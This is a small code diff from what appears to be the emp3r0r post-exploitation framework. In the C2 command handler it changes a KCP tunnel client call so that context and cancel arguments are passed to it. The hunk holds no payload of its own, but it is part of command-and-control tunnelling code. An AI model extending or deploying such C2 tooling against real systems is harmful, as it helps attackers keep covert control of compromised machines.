@@ -89,7 +89,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			// kcp will forward to this target address
 			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcp_listen_port)
 			kcp_server_addr := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.KCPServerPort)
-			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString)
+			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
 			util.TakeABlink() // wait for KCP to start
 		}
 		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
